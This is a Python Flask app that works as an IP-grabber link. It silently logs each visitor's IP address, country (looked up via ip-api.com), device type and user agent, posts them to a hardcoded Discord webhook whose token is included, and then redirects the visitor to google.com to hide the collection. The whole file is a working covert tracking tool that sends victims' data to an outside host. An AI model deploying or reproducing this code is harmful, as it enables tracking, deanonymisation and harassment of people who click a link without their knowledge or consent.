from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1393003795033886791/2DdyN2C662HaDZzF2RZKpWGOGCq_WnLd5HWnl-nfB5MVmiSbgO9BDWkS04RkVSHsW6eS"

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data["status"] == "success":
            return data.get("country", "Unknown")
    except Exception:
        pass
    return "Unknown"

def send_ip_info(ip, country, device, browser, date):
    # JSON payload with embeds, good for Discord webhooks
    data = {
        "content": "Hello Mr King, Someone has contacted you, here's their info:",
        "embeds": [
            {
                "title": "Visitor Information",
                "fields": [
                    {"name": "IP", "value": ip, "inline": True},
                    {"name": "Country", "value": country, "inline": True},
                    {"name": "Device", "value": device, "inline": True},
                    {"name": "Browser", "value": browser, "inline": False},
                    {"name": "Date/Time", "value": date, "inline": False}
                ],
                "color": 5814783
            }
        ]
    }
    requests.post(WEBHOOK_URL, json=data)

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_agent = request.headers.get("User-Agent", "Unknown")

    if "Mobile" in user_agent or "Android" in user_agent or "iPhone" in user_agent:
        device = "Mobile"
    elif "Tablet" in user_agent or "iPad" in user_agent:
        device = "Tablet"
    else:
        device = "Desktop"

    browser = user_agent
    country = get_geo_info(ip)

    send_ip_info(ip, country, device, browser, date)

    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
